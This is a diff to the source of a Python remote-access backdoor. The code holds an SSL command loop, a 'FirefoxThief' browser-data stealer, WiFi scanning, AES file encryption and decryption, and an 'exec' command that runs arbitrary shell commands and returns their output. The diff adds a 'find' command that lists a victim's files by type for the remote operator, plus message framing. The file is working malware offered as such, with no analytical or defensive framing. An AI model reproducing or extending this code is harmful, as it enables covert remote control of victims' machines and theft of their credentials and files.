@@ -125,7 +125,20 @@ except:
 
 def RecvData():
     temp = ssl_sock.read()
-    return temp
+    outData = ""
+    while temp != "SEND":
+        outData += temp
+        temp = ssl_sock.read()
+    return outData
+
+def FindFile(path, fileType):
+    FileList = open("list_"+fileType+".txt", "wa")
+    for root, dirs, files in os.walk(path):
+        for File in files:
+             if File.endswith("."+fileType):
+                 FileList.write(os.path.join(root, File))
+    FileList.close()
+    return "--> list_"+fileType+".txt"
 
 def ScanWIFI(card):
     try:
@@ -139,7 +152,11 @@ def ScanWIFI(card):
 
 def RecvData():
     temp = ssl_sock.read()
-    return temp
+    outData = ""
+    while temp != "SEND":
+        outData += temp
+        temp = ssl_sock.read()
+    return outData
 
 def FirefoxThief():
     if platform.system() == "Linux":
@@ -238,6 +255,7 @@ def CheckHash(fileName, key, IV):
 
 def SendData(inText):
     ssl_sock.write(inText)
+    ssl_sock.write("CEND")
 
 def EXEC(cmd):
     p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
@@ -363,6 +381,12 @@ while 1:
             HEX = inText.split(':')[5]
             cipher = AES.new(key, AES.MODE_CBC, IV)
             Decrypt(fileToDeProtect, cipher, HEX, key, IV)
+    elif inText.startswith("find"):
+        if len(inText.split(":")) == 3:
+            listFile = FindFile(inText.split(":")[1],inText.split(":")[2])
+            SendData(listFile)
+        else:
+            SendData("usage: find:path:type")
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
@@ -381,4 +405,4 @@ while 1:
         FirefoxThief()
     else:
         print '[inText] ' + inText
-        ssl_sock.write(inText)
+        SendData(inText)
